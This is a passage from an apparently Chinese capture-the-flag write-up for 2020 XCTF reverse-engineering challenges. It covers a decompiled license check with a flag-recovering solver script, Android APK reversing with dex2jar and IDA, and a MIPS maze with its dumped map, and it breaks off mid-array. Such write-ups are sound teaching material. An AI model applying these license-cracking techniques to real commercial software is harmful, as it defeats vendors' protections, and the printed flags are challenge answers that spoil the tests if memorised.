class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Function 0_0:  to_v()</span></span><br><span class="line"><span class="comment"># Function 0_1:  encrypt()</span></span><br><span class="line"><span class="comment"># Function 0_2:  check_license()</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">to_v</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="keyword">return</span> [<span class="built_in">ord</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> s]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="keyword">global</span> tb0,tb1,tb2</span><br><span class="line">    u1,u2,u3=tb0,tb2,tb1 <span class="comment">#这个upvalue对应我也不知道是怎么看出来的，可能靠试吧</span></span><br><span class="line">    l1=to_v(s)</span><br><span class="line">    size=<span class="built_in">len</span>(l1)</span><br><span class="line">    l2=[]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(size):</span><br><span class="line">        l1[i]^=u1[i]</span><br><span class="line">        l2.append(u2[l1[i]+<span class="number">1</span>])</span><br><span class="line">    r3=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(size):</span><br><span class="line">        <span class="keyword">if</span> l2[i]==u3[i]:</span><br><span class="line">            r3+=<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            r3+=<span class="number">2</span></span><br><span class="line">    <span class="keyword">if</span> r3!=size:</span><br><span class="line">        print(<span class="string">&quot;bad&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">&quot;good&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_license</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(s)!=<span class="number">25</span>:</span><br><span class="line">        print(<span class="string">&quot;length error&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        encrypt(s)</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    tb0=[<span class="number">172</span>, <span class="number">25</span>, <span class="number">60</span>, <span class="number">95</span>, <span class="number">5</span>, <span class="number">27</span>, <span class="number">49</span>, <span class="number">58</span>, <span class="number">171</span>, <span class="number">5</span>, <span class="number">253</span>, <span class="number">45</span>, <span class="number">87</span>, <span class="number">246</span>, <span class="number">197</span>, <span class="number">12</span>, <span class="number">97</span>, <span class="number">234</span>, <span class="number">159</span>, <span class="number">119</span>, <span class="number">157</span>, <span class="number">169</span>, <span class="number">121</span>, <span class="number">54</span>, <span class="number">242</span>]</span><br><span class="line">    tb1=[<span class="number">94</span>, <span class="number">117</span>, <span class="number">57</span>, <span class="number">37</span>, <span class="number">54</span>, <span class="number">110</span>, <span class="number">15</span>, <span class="number">223</span>, <span class="number">163</span>, <span class="number">133</span>, <span class="number">99</span>, <span class="number">237</span>, <span class="number">8</span>, <span class="number">128</span>, <span class="number">27</span>, <span class="number">54</span>, <span class="number">233</span>, <span class="number">181</span>, <span class="number">242</span>, <span class="number">55</span>, <span class="number">230</span>, <span class="number">62</span>, <span class="number">42</span>, <span class="number">252</span>, <span class="number">116</span>]</span><br><span class="line">    tb2=[<span class="number">81</span>, <span class="number">138</span>, <span class="number">85</span>, <span class="number">142</span>, <span class="number">185</span>, <span class="number">35</span>, <span class="number">229</span>, <span class="number">83</span>, <span class="number">8</span>, <span class="number">225</span>, <span class="number">92</span>, <span class="number">223</span>, <span class="number">222</span>, <span class="number">47</span>, <span class="number">182</span>, <span class="number">158</span>, <span class="number">17</span>, <span class="number">74</span>, <span class="number">34</span>, <span class="number">100</span>, <span class="number">43</span>, <span class="number">103</span>, <span class="number">102</span>, <span class="number">147</span>, <span class="number">237</span>, <span class="number">88</span>, <span class="number">73</span>, <span class="number">28</span>, <span class="number">224</span>, <span class="number">23</span>, <span class="number">44</span>, <span class="number">40</span>, <span class="number">154</span>, <span class="number">127</span>, <span class="number">16</span>, <span class="number">169</span>, <span class="number">160</span>, <span class="number">118</span>, <span class="number">51</span>, <span class="number">194</span>, <span class="number">31</span>, <span class="number">68</span>, <span class="number">89</span>, <span class="number">65</span>, <span class="number">162</span>, <span class="number">13</span>, <span class="number">141</span>, <span class="number">0</span>, <span class="number">244</span>, <span class="number">119</span>, <span class="number">161</span>, <span class="number">198</span>, <span class="number">228</span>, <span class="number">95</span>, <span class="number">10</span>, <span class="number">78</span>, <span class="number">37</span>, <span class="number">121</span>, <span class="number">236</span>, <span class="number">59</span>, <span class="number">60</span>, <span class="number">91</span>, <span class="number">146</span>, <span class="number">46</span>, <span class="number">77</span>, <span class="number">218</span>, <span class="number">66</span>, <span class="number">200</span>, <span class="number">61</span>, <span class="number">241</span>, <span class="number">70</span>, <span class="number">55</span>, <span class="number">39</span>, <span class="number">227</span>, <span class="number">42</span>, <span class="number">2</span>, <span class="number">231</span>, <span class="number">235</span>, <span class="number">122</span>, <span class="number">135</span>, <span class="number">152</span>, <span class="number">137</span>, <span class="number">173</span>, <span class="number">232</span>, <span class="number">101</span>, <span class="number">75</span>, <span class="number">233</span>, <span class="number">21</span>, <span class="number">252</span>, <span class="number">15</span>, <span class="number">133</span>, <span class="number">111</span>, <span class="number">205</span>, <span class="number">57</span>, <span class="number">132</span>, <span class="number">187</span>, <span class="number">96</span>, <span class="number">49</span>, <span class="number">124</span>, <span class="number">86</span>, <span class="number">19</span>, <span class="number">188</span>, <span class="number">80</span>, <span class="number">213</span>, <span class="number">106</span>, <span class="number">214</span>, <span class="number">203</span>, <span class="number">177</span>, <span class="number">56</span>, <span class="number">104</span>, <span class="number">82</span>, <span class="number">110</span>, <span class="number">196</span>, <span class="number">113</span>, <span class="number">155</span>, <span class="number">170</span>, <span class="number">150</span>, <span class="number">117</span>, <span class="number">26</span>, <span class="number">140</span>, <span class="number">144</span>, <span class="number">11</span>, <span class="number">172</span>, <span class="number">67</span>, <span class="number">209</span>, <span class="number">125</span>, <span class="number">54</span>, <span class="number">58</span>, <span class="number">128</span>, <span class="number">204</span>, <span class="number">186</span>, <span class="number">199</span>, <span class="number">189</span>, <span class="number">208</span>, <span class="number">239</span>, <span class="number">143</span>, <span class="number">249</span>, <span class="number">246</span>, <span class="number">1</span>, <span class="number">139</span>, <span class="number">33</span>, <span class="number">87</span>, <span class="number">64</span>, <span class="number">116</span>, <span class="number">84</span>, <span class="number">254</span>, <span class="number">126</span>, <span class="number">202</span>, <span class="number">148</span>, <span class="number">76</span>, <span class="number">247</span>, <span class="number">115</span>, <span class="number">109</span>, <span class="number">3</span>, <span class="number">238</span>, <span class="number">114</span>, <span class="number">156</span>, <span class="number">195</span>, <span class="number">163</span>, <span class="number">159</span>, <span class="number">52</span>, <span class="number">36</span>, <span class="number">245</span>, <span class="number">240</span>, <span class="number">63</span>, <span class="number">153</span>, <span class="number">166</span>, <span class="number">167</span>, <span class="number">175</span>, <span class="number">9</span>, <span class="number">151</span>, <span class="number">171</span>, <span class="number">216</span>, <span class="number">207</span>, <span class="number">179</span>, <span class="number">72</span>, <span class="number">176</span>, <span class="number">48</span>, <span class="number">178</span>, <span class="number">157</span>, <span class="number">20</span>, <span class="number">181</span>, <span class="number">149</span>, <span class="number">53</span>, <span class="number">184</span>, <span class="number">4</span>, <span class="number">136</span>, <span class="number">165</span>, <span class="number">217</span>, <span class="number">50</span>, <span class="number">190</span>, <span class="number">191</span>, <span class="number">192</span>, <span class="number">193</span>, <span class="number">98</span>, <span class="number">215</span>, <span class="number">62</span>, <span class="number">112</span>, <span class="number">38</span>, <span class="number">90</span>, <span class="number">123</span>, <span class="number">105</span>, <span class="number">94</span>, <span class="number">221</span>, <span class="number">99</span>, <span class="number">201</span>, <span class="number">206</span>, <span class="number">251</span>, <span class="number">14</span>, <span class="number">211</span>, <span class="number">220</span>, <span class="number">131</span>, <span class="number">212</span>, <span class="number">130</span>, <span class="number">134</span>, <span class="number">253</span>, <span class="number">120</span>, <span class="number">145</span>, <span class="number">18</span>, <span class="number">219</span>, <span class="number">79</span>, <span class="number">129</span>, <span class="number">12</span>, <span class="number">93</span>, <span class="number">5</span>, <span class="number">183</span>, <span class="number">107</span>, <span class="number">71</span>, <span class="number">226</span>, <span class="number">180</span>, <span class="number">24</span>, <span class="number">234</span>, <span class="number">7</span>, <span class="number">108</span>, <span class="number">174</span>, <span class="number">6</span>, <span class="number">45</span>, <span class="number">29</span>, <span class="number">32</span>, <span class="number">168</span>, <span class="number">230</span>, <span class="number">197</span>, <span class="number">41</span>, <span class="number">25</span>, <span class="number">255</span>, <span class="number">164</span>, <span class="number">27</span>, <span class="number">210</span>, <span class="number">248</span>, <span class="number">97</span>, <span class="number">250</span>, <span class="number">22</span>, <span class="number">242</span>, <span class="number">243</span>, <span class="number">30</span>, <span class="number">69</span>]</span><br><span class="line">    print(<span class="string">&quot;input: &quot;</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    license=<span class="built_in">input</span>()</span><br><span class="line">    check_license(license)</span><br></pre></td></tr></table></figure><p>就可以根据逻辑写出exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">tb0=[<span class="number">172</span>, <span class="number">25</span>, <span class="number">60</span>, <span class="number">95</span>, <span class="number">5</span>, <span class="number">27</span>, <span class="number">49</span>, <span class="number">58</span>, <span class="number">171</span>, <span class="number">5</span>, <span class="number">253</span>, <span class="number">45</span>, <span class="number">87</span>, <span class="number">246</span>, <span class="number">197</span>, <span class="number">12</span>, <span class="number">97</span>, <span class="number">234</span>, <span class="number">159</span>, <span class="number">119</span>, <span class="number">157</span>, <span class="number">169</span>, <span class="number">121</span>, <span class="number">54</span>, <span class="number">242</span>]</span><br><span class="line">tb1=[<span class="number">94</span>, <span class="number">117</span>, <span class="number">57</span>, <span class="number">37</span>, <span class="number">54</span>, <span class="number">110</span>, <span class="number">15</span>, <span class="number">223</span>, <span class="number">163</span>, <span class="number">133</span>, <span class="number">99</span>, <span class="number">237</span>, <span class="number">8</span>, <span class="number">128</span>, <span class="number">27</span>, <span class="number">54</span>, <span class="number">233</span>, <span class="number">181</span>, <span class="number">242</span>, <span class="number">55</span>, <span class="number">230</span>, <span class="number">62</span>, <span class="number">42</span>, <span class="number">252</span>, <span class="number">116</span>]</span><br><span class="line">tb2=[<span class="number">81</span>, <span class="number">138</span>, <span class="number">85</span>, <span class="number">142</span>, <span class="number">185</span>, <span class="number">35</span>, <span class="number">229</span>, <span class="number">83</span>, <span class="number">8</span>, <span class="number">225</span>, <span class="number">92</span>, <span class="number">223</span>, <span class="number">222</span>, <span class="number">47</span>, <span class="number">182</span>, <span class="number">158</span>, <span class="number">17</span>, <span class="number">74</span>, <span class="number">34</span>, <span class="number">100</span>, <span class="number">43</span>, <span class="number">103</span>, <span class="number">102</span>, <span class="number">147</span>, <span class="number">237</span>, <span class="number">88</span>, <span class="number">73</span>, <span class="number">28</span>, <span class="number">224</span>, <span class="number">23</span>, <span class="number">44</span>, <span class="number">40</span>, <span class="number">154</span>, <span class="number">127</span>, <span class="number">16</span>, <span class="number">169</span>, <span class="number">160</span>, <span class="number">118</span>, <span class="number">51</span>, <span class="number">194</span>, <span class="number">31</span>, <span class="number">68</span>, <span class="number">89</span>, <span class="number">65</span>, <span class="number">162</span>, <span class="number">13</span>, <span class="number">141</span>, <span class="number">0</span>, <span class="number">244</span>, <span class="number">119</span>, <span class="number">161</span>, <span class="number">198</span>, <span class="number">228</span>, <span class="number">95</span>, <span class="number">10</span>, <span class="number">78</span>, <span class="number">37</span>, <span class="number">121</span>, <span class="number">236</span>, <span class="number">59</span>, <span class="number">60</span>, <span class="number">91</span>, <span class="number">146</span>, <span class="number">46</span>, <span class="number">77</span>, <span class="number">218</span>, <span class="number">66</span>, <span class="number">200</span>, <span class="number">61</span>, <span class="number">241</span>, <span class="number">70</span>, <span class="number">55</span>, <span class="number">39</span>, <span class="number">227</span>, <span class="number">42</span>, <span class="number">2</span>, <span class="number">231</span>, <span class="number">235</span>, <span class="number">122</span>, <span class="number">135</span>, <span class="number">152</span>, <span class="number">137</span>, <span class="number">173</span>, <span class="number">232</span>, <span class="number">101</span>, <span class="number">75</span>, <span class="number">233</span>, <span class="number">21</span>, <span class="number">252</span>, <span class="number">15</span>, <span class="number">133</span>, <span class="number">111</span>, <span class="number">205</span>, <span class="number">57</span>, <span class="number">132</span>, <span class="number">187</span>, <span class="number">96</span>, <span class="number">49</span>, <span class="number">124</span>, <span class="number">86</span>, <span class="number">19</span>, <span class="number">188</span>, <span class="number">80</span>, <span class="number">213</span>, <span class="number">106</span>, <span class="number">214</span>, <span class="number">203</span>, <span class="number">177</span>, <span class="number">56</span>, <span class="number">104</span>, <span class="number">82</span>, <span class="number">110</span>, <span class="number">196</span>, <span class="number">113</span>, <span class="number">155</span>, <span class="number">170</span>, <span class="number">150</span>, <span class="number">117</span>, <span class="number">26</span>, <span class="number">140</span>, <span class="number">144</span>, <span class="number">11</span>, <span class="number">172</span>, <span class="number">67</span>, <span class="number">209</span>, <span class="number">125</span>, <span class="number">54</span>, <span class="number">58</span>, <span class="number">128</span>, <span class="number">204</span>, <span class="number">186</span>, <span class="number">199</span>, <span class="number">189</span>, <span class="number">208</span>, <span class="number">239</span>, <span class="number">143</span>, <span class="number">249</span>, <span class="number">246</span>, <span class="number">1</span>, <span class="number">139</span>, <span class="number">33</span>, <span class="number">87</span>, <span class="number">64</span>, <span class="number">116</span>, <span class="number">84</span>, <span class="number">254</span>, <span class="number">126</span>, <span class="number">202</span>, <span class="number">148</span>, <span class="number">76</span>, <span class="number">247</span>, <span class="number">115</span>, <span class="number">109</span>, <span class="number">3</span>, <span class="number">238</span>, <span class="number">114</span>, <span class="number">156</span>, <span class="number">195</span>, <span class="number">163</span>, <span class="number">159</span>, <span class="number">52</span>, <span class="number">36</span>, <span class="number">245</span>, <span class="number">240</span>, <span class="number">63</span>, <span class="number">153</span>, <span class="number">166</span>, <span class="number">167</span>, <span class="number">175</span>, <span class="number">9</span>, <span class="number">151</span>, <span class="number">171</span>, <span class="number">216</span>, <span class="number">207</span>, <span class="number">179</span>, <span class="number">72</span>, <span class="number">176</span>, <span class="number">48</span>, <span class="number">178</span>, <span class="number">157</span>, <span class="number">20</span>, <span class="number">181</span>, <span class="number">149</span>, <span class="number">53</span>, <span class="number">184</span>, <span class="number">4</span>, <span class="number">136</span>, <span class="number">165</span>, <span class="number">217</span>, <span class="number">50</span>, <span class="number">190</span>, <span class="number">191</span>, <span class="number">192</span>, <span class="number">193</span>, <span class="number">98</span>, <span class="number">215</span>, <span class="number">62</span>, <span class="number">112</span>, <span class="number">38</span>, <span class="number">90</span>, <span class="number">123</span>, <span class="number">105</span>, <span class="number">94</span>, <span class="number">221</span>, <span class="number">99</span>, <span class="number">201</span>, <span class="number">206</span>, <span class="number">251</span>, <span class="number">14</span>, <span class="number">211</span>, <span class="number">220</span>, <span class="number">131</span>, <span class="number">212</span>, <span class="number">130</span>, <span class="number">134</span>, <span class="number">253</span>, <span class="number">120</span>, <span class="number">145</span>, <span class="number">18</span>, <span class="number">219</span>, <span class="number">79</span>, <span class="number">129</span>, <span class="number">12</span>, <span class="number">93</span>, <span class="number">5</span>, <span class="number">183</span>, <span class="number">107</span>, <span class="number">71</span>, <span class="number">226</span>, <span class="number">180</span>, <span class="number">24</span>, <span class="number">234</span>, <span class="number">7</span>, <span class="number">108</span>, <span class="number">174</span>, <span class="number">6</span>, <span class="number">45</span>, <span class="number">29</span>, <span class="number">32</span>, <span class="number">168</span>, <span class="number">230</span>, <span class="number">197</span>, <span class="number">41</span>, <span class="number">25</span>, <span class="number">255</span>, <span class="number">164</span>, <span class="number">27</span>, <span class="number">210</span>, <span class="number">248</span>, <span class="number">97</span>, <span class="number">250</span>, <span class="number">22</span>, <span class="number">242</span>, <span class="number">243</span>, <span class="number">30</span>, <span class="number">69</span>]</span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">25</span>):</span><br><span class="line">    flag+=<span class="built_in">chr</span>(tb2.index(tb1[i])^tb0[i])</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><p>得到flag</p><p><img src="/p/wpFor-2020XCTF/image-20210304150822710.png"></p><p><strong>flag{th15_15_v3r7_c0mm3n}</strong></p><h2 id="divination-TO-DO"><a href="#divination-TO-DO" class="headerlink" title="divination[TO DO]"></a>divination[TO DO]</h2><p>先用模拟器跑一下，发现是一个输入字符串判断的逻辑。</p><blockquote><p>因为物理机里装了WSL2，所以用的是能兼容Hyper-V的BlueStacks模拟器。</p></blockquote><p><img src="/p/wpFor-2020XCTF/image-20210221004556852.png"></p><p>走流程，先用<a href="https://github.com/pxb1988/dex2jar">pxb1988&#x2F;dex2jar: Tools to work with android .dex and java .class files</a>这个工具把将apk解压后文件夹中的classes.dex文件转换成jar文件，再用<a href="https://java-decompiler.github.io/">Java Decompiler</a>中的JD-GUI查看反编译出的java源代码。</p><p>然后可以看到MainActivity.class这里也有一句“大事不妙”，找到主函数。</p><p><img src="/p/wpFor-2020XCTF/image-20210221005218142.png"></p><p>看了一下逻辑就是调用libdivination.so（在apk解压后的路径<code>divination/lib/arm64-v8a/libdivination.so</code>），只要返回值为真就行。</p><p><del>所以其实做安卓逆向看so硬逆也能逆出来hhh。</del></p><p>于是现在转去逆so。</p><p><img src="/p/wpFor-2020XCTF/image-20210221102702774.png"></p><p>关键入口函数显而易见，就是这个跟包同名的函数。</p><p><img src="/p/wpFor-2020XCTF/image-20210221110434855.png"></p><p>为了方便看反编译代码，按<code>y</code>把a1-a3三个参数的变量类型进行更改（ida无法自动识别。</p><p><img src="/p/wpFor-2020XCTF/image-20210221110645265.png"></p><p>下边的函数也一目了然。</p><p>从后往前看，先拿到目标数组unk_3000：</p><p><img src="/p/wpFor-2020XCTF/image-20210221111251068.png"></p><hr><h1 id="12-23-鲲鹏计算专场"><a href="#12-23-鲲鹏计算专场" class="headerlink" title="[12.23] 鲲鹏计算专场"></a>[12.23] 鲲鹏计算专场</h1><h2 id="mips"><a href="#mips" class="headerlink" title="mips"></a>mips</h2><blockquote><p>真·送分题，可惜当时要上课没来得及抢一血（下午2点放题绝了</p><p>老传统走迷宫</p></blockquote><p>mips架构。</p><p>ida反编译以后可以看到</p><p><img src="/p/wpFor-2020XCTF/image-20201229125551113.png"></p><p>v4是我们输入的字符串，很明显是迷宫逻辑，上下左右用wasd走，迷宫存在dword_100111F0里。</p><p>sub_10000744()这个初始函数是用来找起点用的（就是迷宫中3所在的地方，在后面可以看到3其实表示的是当前位置）。</p><p><img src="/p/wpFor-2020XCTF/image-20201229125822518.png"></p><p>这里也可以看到应该有多个迷宫（dword_10011D10是用来表示第几个迷宫的，且&lt;&#x3D;2，一个迷宫有225个数）+一个迷宫宽为15&#x3D;三个迷宫，每个迷宫为15*15。</p><p>然后就是下面的四个函数，随便挑一个出来（比如sub_10000D28()）可以看到</p><p><img src="/p/wpFor-2020XCTF/image-20201229130146475.png"></p><p>很明显是个往右走的函数，3表示当前位置，并把上一个当前位置标为1（可走路径）。并且可以看到终点是4，就是说我们要把每个迷宫从3走到4。</p><p>dump迷宫数组，写脚本打印迷宫：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">aMap=[<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span 